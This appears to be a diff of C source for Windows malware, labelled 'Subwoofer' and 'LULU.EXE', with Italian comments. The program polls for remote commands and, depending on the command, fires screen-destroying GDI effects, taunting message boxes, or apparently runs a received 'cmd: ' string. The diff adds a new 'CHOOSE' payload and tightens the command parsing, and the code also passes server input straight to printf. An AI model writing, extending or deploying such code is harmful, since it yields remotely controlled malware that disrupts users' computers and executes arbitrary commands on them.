@@ -184,7 +184,7 @@ void pixelate() {
     DeleteDC(smally);
     ReleaseDC(NULL, hdc);
 
-    Sleep(1000);
+    Sleep(200);
 }
 
 void lulu() {
@@ -257,7 +257,7 @@ void msgbox() {
     };
 
     int randomtext = rand() % 7; // ricorda di updatare qui quando addi frasi nuove, so che te lo scordi.
-    MessageBox(NULL, frasi[randomtext], "MessageBox", MB_OK | MB_ICONINFORMATION);
+    MessageBox(NULL, frasi[randomtext], "Subwoofer", MB_OK | MB_ICONINFORMATION);
 }
 
 void cleandwm() {
@@ -300,16 +300,30 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
         else if (GetTickCount64() - elapsed < 12000) {pixelate();}
         else if (GetTickCount64() - elapsed < 13000) {heightglitch_run();}
         else if (GetTickCount64() - elapsed < 14000) {TextOut(hdc, w, h, "Subwoofer", 9);}
-        else if (GetTickCount64() - elapsed < 16000) {widthglitch_run();}
+        else if (GetTickCount64() - elapsed < 12000) {pixelate();}
+        else if (GetTickCount64() - elapsed < 16000) {widthglitch_run();pixelate();}
         else if (GetTickCount64() - elapsed < 21000) {lulu();}
-        else if (GetTickCount64() - elapsed < 29000) {ltunnel_run();}
+        else if (GetTickCount64() - elapsed < 12000) {pixelate();}
+        else if (GetTickCount64() - elapsed < 29000) {ltunnel_run();pixelate();}
+        else if (GetTickCount64() - elapsed < 12000) {pixelate();}
         else if (GetTickCount64() - elapsed < 33000) {tunnel_run();}
         else if (GetTickCount64() - elapsed < 43000) {fkngmelter();}
+        else if (GetTickCount64() - elapsed < 12000) {pixelate();}
         else if (GetTickCount64() - elapsed < 63000) {squarefx_run();}
-        else if (GetTickCount64() - elapsed < 65000) {circleshake_run();}
+        else if (GetTickCount64() - elapsed < 65000) {circleshake_run();pixelate();}
         else if (GetTickCount64() - elapsed < 69000) {tunnel_run();ltunnel_run();}
         else if (GetTickCount64() - elapsed < 77000) {fkngmelter();heightglitch_run();}
         else {break;}
+    }
+}
+
+void wrongchoose() {
+    ULONGLONG elapsed = GetTickCount64();
+    MessageBoxW(NULL, L"Sai chi e' Lulu'?", L"Scegli", MB_YESNO | MB_ICONINFORMATION); // la (L"xyz") server per fare l'unicode e non ansi. Altrimenti le robbe tipo "eùàò" si sminchianoo
+    MessageBox(NULL, "Mi dispiace, hai sbagliato", "LULU.EXE", MB_OK | MB_ICONERROR);
+    while(1) {
+        if (GetTickCount64() - elapsed < 60000) {lulu();pixelate();}
+        else if (GetTickCount64() - elapsed < 80000) {fkngmelter();}
     }
 }
 
@@ -350,53 +364,58 @@ int main() {
         "Timer: x" - start countdown stuff
         */
 
-        if (strstr(reqtextbuffer, "1")) {
+        if (strcmp(reqtextbuffer, "1") == 0) {
             int i;
             for (i=0;i<100;i++) {startfx();}
         }
 
-        else if (strstr(reqtextbuffer, "2")) {
+        else if (strcmp(reqtextbuffer, "2") == 0) {
             int i;
             for(i=0;i<100;i++) {heightglitch_run();}
         }
 
-        else if (strstr(reqtextbuffer, "3")) {
+        else if (strcmp(reqtextbuffer, "3") == 0) {
             int i;
             for(i=0;i<100;i++) {widthglitch_run();}
         }
 
-        else if (strstr(reqtextbuffer, "4")) {
+        else if (strcmp(reqtextbuffer, "4") == 0) {
             int i;
             for(i=0;i<100;i++) {tunnel_run();}
         }
 
-        else if (strstr(reqtextbuffer, "5")) {
+        else if (strcmp(reqtextbuffer, "5") == 0) {
             int i;
             for (i=0;i<100;i++) {circleshake_run();}
         }
 
-        else if (strstr(reqtextbuffer, "6")) {
+        else if (strcmp(reqtextbuffer, "6") == 0) {
             int i;
             for (i=0;i<100;i++) {ltunnel_run();}
         }
 
-        else if (strstr(reqtextbuffer, "7")) {
+        else if (strcmp(reqtextbuffer, "7") == 0) {
             int i;
             for (i=0;i<500;i++) {squarefx_run();}
         }
 
-        else if (strstr(reqtextbuffer, "8")) {
+        else if (strcmp(reqtextbuffer, "8") == 0) {
             int i;
             for (i=0;i<1000;i++) {fkngmelter();}
         }
 
-        else if (strstr(reqtextbuffer, "Lulu")) {
+        else if (strcmp(reqtextbuffer, "Lulu") == 0) {
             int i;
             for (i=0;i<500;i++) {lulu();}
         }
-        else if (strstr(reqtextbuffer, "Pixy")) {
+
+        else if (strcmp(reqtextbuffer, "Pixy") == 0) {
             int i;
             for (i=0;i<1000;i++) {pixelate();}
+        }
+
+        else if (strcmp(reqtextbuffer, "CHOOSE") == 0) {
+            wrongchoose();
         }
 
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
@@ -408,8 +427,8 @@ int main() {
             Sleep(20000);
         }
 
-        else if (strstr(reqtextbuffer, "CleanDWM")) {cleandwm();}
-        else if (strstr(reqtextbuffer, "RandomMSGs")) {msgbox();}
+        else if (strcmp(reqtextbuffer, "CleanDWM") == 0) {cleandwm();}
+        else if (strcmp(reqtextbuffer, "RandomMSGs") == 0) {msgbox();}
 
         else if (strstr(reqtextbuffer, "Timer: ")) {
             printf(reqtextbuffer);
